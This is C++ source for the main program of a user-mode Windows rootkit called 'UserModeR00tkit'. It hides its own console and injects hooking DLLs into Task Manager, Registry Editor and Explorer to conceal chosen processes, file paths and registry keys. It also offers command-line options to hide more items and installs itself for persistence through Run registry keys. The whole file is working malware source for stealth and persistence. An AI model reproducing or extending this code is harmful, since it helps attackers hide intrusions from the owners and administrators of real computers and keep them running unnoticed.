#include <iostream>
#include <Windows.h>
#include <vector>
#include <WbemIdl.h>
#include <comutil.h>
#include <AccCtrl.h>
#include <Aclapi.h> 
#include <string>
#include <unordered_map>
#include "IPCObjects.h"
#include "multiDLLInjector.h"
#include "newProcessMonitor.h"
#include "persistence.h"

using namespace std;

#define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PATH_DLL "S:\\MalwareDeveloped\\S12URootkit\\fileHooks\\x64\\Release\\fileHooks.dll"
#define REGISTER_DLL "S:\\MalwareDeveloped\\S12URootkit\\registryHooks\\x64\\Release\\registryHooks.dll"


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    unordered_map<string, vector<string>> injectionMap;
    Serialitzator serialitzator("");

    // Process
    vector<wchar_t*> processesToHide;
    wstring str1 = L"UserModeR00tkit.exe";
    processesToHide.push_back((wchar_t*)str1.c_str());

    // Path
    vector<wstring> pathsToHide;
    wstring str2 = findFileDirectory(L"UserModeR00tkit.exe");
    /*size_t found = str2.find(L'\\');
    while (found != std::wstring::npos) {
        str2.replace(found, 1, L"/");
        found = str2.find(L'\\', found + 1);
    }
    OutputDebugStringW(str2.c_str());*/
    pathsToHide.push_back(str2);

    // Registry
    vector<wstring> registryKeysToHide;
    wstring str3 = L"hide";
    registryKeysToHide.push_back(str3);

    serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
    serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
    serialitzator.serializeVectorWString(registryKeysToHide, L"registryMapped");

    LPWSTR* argv;
    int argc;
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    // - rootkit.exe process hide processname.exe
    // - rootkit.exe process hide processname.exe
    if (argc == 4 && wcscmp(argv[1], L"process") == 0 && wcscmp(argv[2], L"hide") == 0) {
        wchar_t* processName = argv[3];
        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"processAgentMapped");
        wstring processNameW(processName);
        deserializedStrings.push_back(&processNameW[0]);
        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
        injectDlls(injectionMap);
        newProcessListener();
    }

    // - rootkit.exe process unhide processname.exe
    if (argc == 4 && wcscmp(argv[1], L"process") == 0 && wcscmp(argv[2], L"unhide") == 0) {
        wchar_t* processName = argv[3];
        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
        wstring processNameW(processName);
        for (auto it = deserializedStrings.begin(); it != deserializedStrings.end(); ++it) {
            if (wcscmp(*it, &processNameW[0]) == 0) {
                deserializedStrings.erase(it);
                break;
            }
        }
        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
        injectDlls(injectionMap);
        newProcessListener();
    }

    // - rootkit.exe path hide filename.exe
    if (argc == 4 && wcscmp(argv[1], L"path") == 0 && wcscmp(argv[2], L"hide") == 0) {
        // - rootkit.exe file hide filename.exe
        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"pathMapped");

        // convert wchar_t* to wstring
        wchar_t* path = argv[3];
        deserializedStrings.push_back(path);
        serialitzator.serializeVectorWString(deserializedStrings, L"pathMapped");
    }

    // - rootkit.exe path unhide filename.exe
    if (argc == 4 && wcscmp(argv[1], L"path") == 0 && wcscmp(argv[2], L"unhide") == 0) {
        // - rootkit.exe file unhide filename.exe
        // Add logic for unhide if needed
    }

    // - rootkit.exe registry hide keyname
    if (argc == 4 && wcscmp(argv[1], L"registry") == 0 && wcscmp(argv[2], L"hide") == 0) {
        // - rootkit.exe registry hide keyname
        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"registryMapped");
        wchar_t* key = argv[3];
        deserializedStrings.push_back(key);
        serialitzator.serializeVectorWString(deserializedStrings, L"registryMapped");
        injectionMap["regedit.exe"] = { REGISTER_DLL };
        injectDlls(injectionMap);
        newProcessListener();
    }

    // - rootkit.exe registry unhide keyname
    if (argc == 4 && wcscmp(argv[1], L"registry") == 0 && wcscmp(argv[2], L"unhide") == 0) {
        // - rootkit.exe registry unhide keyname
        // Add logic for unhide if needed
    }


    injectionMap["explorer.exe"] = { PATH_DLL };
    injectDlls(injectionMap);

    const char* exePath = findFilePath("UserModeR00tkit.exe");
    persistenceViaRunKeys(exePath);
    
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return static_cast<int>(msg.wParam);
}


